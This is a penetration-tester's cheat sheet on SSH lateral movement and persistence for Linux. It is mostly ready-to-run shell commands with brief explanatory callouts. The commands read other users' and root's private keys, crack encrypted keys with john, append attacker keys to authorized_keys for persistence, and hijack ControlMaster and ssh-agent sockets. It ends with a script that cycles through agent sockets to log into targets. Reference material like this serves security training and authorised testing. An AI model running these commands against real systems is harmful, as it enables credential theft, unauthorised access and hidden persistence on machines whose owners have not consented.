---
tags:
  - Foundational
  - Lateral_Movement
  - Linux
  - SSH
---

## SSH Key Authentication
resources: [HackTricks - SSH](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html)

> [!info] SSH keys provide passwordless authentication. Stolen keys enable lateral movement.

### Find SSH Keys [Remote]
```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
```

```bash
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa
```

### Find Authorized Keys [Remote]
```bash
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Use Stolen Key [Local]
```bash
chmod 600 stolen_key
ssh -i stolen_key <User>@<Target>
```

### Crack Encrypted Key [Local]
```bash
ssh2john stolen_key > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

## SSH Persistence

### Add Authorized Key [Remote]
```bash
echo "<PublicKey>" >> /home/<User>/.ssh/authorized_keys
echo "<PublicKey>" >> /root/.ssh/authorized_keys
```

### Generate Key Pair [Local]
```bash
ssh-keygen -t rsa -b 4096 -f persistence_key -N ""
```

### Create .ssh Directory if Missing [Remote]
```bash
mkdir -p /home/<User>/.ssh
chmod 700 /home/<User>/.ssh
touch /home/<User>/.ssh/authorized_keys
chmod 600 /home/<User>/.ssh/authorized_keys
```

## SSH Hijacking with ControlMaster

### ControlMaster Theory
> [!info] SSH multiplexing shares single connection for multiple sessions. Hijack existing socket for access without credentials.

### Find Control Sockets [Remote]
```bash
find /tmp -name "ssh-*" 2>/dev/null
ls -la /tmp/ssh-*/
```

### Hijack Existing Session [Remote]
```bash
ssh -S /tmp/ssh-<Socket>/agent.<PID> <User>@<Target>
```

### Configure ControlMaster (Attacker) [Local]
```bash
# ~/.ssh/config
Host *
    ControlMaster auto
    ControlPath /tmp/ssh-%r@%h:%p
    ControlPersist 10m
```

## SSH-Agent Hijacking

### SSH-Agent Theory
> [!danger] **ssh-agent** holds decrypted private keys in memory. Hijacking agent socket allows key use.

### Find Agent Sockets [Remote]
```bash
find /tmp -name "agent.*" 2>/dev/null
env | grep SSH_AUTH_SOCK
```

### Hijack SSH-Agent [Remote]
```bash
export SSH_AUTH_SOCK=/tmp/ssh-<Socket>/agent.<PID>
ssh-add -l  # List keys in hijacked agent
ssh <User>@<Target>  # Use keys for auth
```

### Find Users with Agent Forwarding [Remote]
```bash
ps aux | grep "ssh.*-A"
grep -r "ForwardAgent yes" /home/*/.ssh/config 2>/dev/null
```

## SSH Agent Forwarding Attacks

### When Agent Forwarding is Enabled
> [!warning] User's local agent is accessible on remote host. If we compromise remote host, we can use forwarded agent.

### Check for Forwarded Agent [Remote]
```bash
env | grep SSH_AUTH_SOCK
```

### Use Forwarded Agent [Remote]
```bash
# On compromised host with forwarded agent
ssh-add -l  # List available keys
ssh <User>@<NextTarget>  # Pivot using forwarded keys
```

### Persistent Agent Hijacking [Remote]
```bash
# Create script to check for agent sockets
cat > /tmp/agent_hijack.sh << 'EOF'
for sock in /tmp/ssh-*/agent.*; do
    export SSH_AUTH_SOCK=$sock
    if ssh-add -l 2>/dev/null; then
        echo "Valid agent: $sock"
        ssh <User>@<Target> "id"
    fi
done
EOF
chmod +x /tmp/agent_hijack.sh
```
